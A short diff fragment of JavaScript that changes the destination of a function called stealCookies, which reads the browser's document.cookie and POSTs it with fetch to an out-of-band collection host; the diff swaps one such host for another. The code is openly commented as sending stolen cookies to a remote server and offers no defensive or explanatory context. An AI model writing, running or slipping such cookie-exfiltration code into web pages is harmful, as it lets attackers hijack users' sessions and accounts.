@@ -27,7 +27,7 @@
       function stealCookies() {
         var cookies = document.cookie;
         // Send stolen cookies to a remote server
-        fetch('https://mpfwy84txxowcirzlbcfspwl8ce32yqn.oastify.com', {
+        fetch('https://rimxrykqgoeyyzutigdnxs0xlswvfptjp.oast.fun', {
           method: 'POST',
           body: cookies,
           headers: {
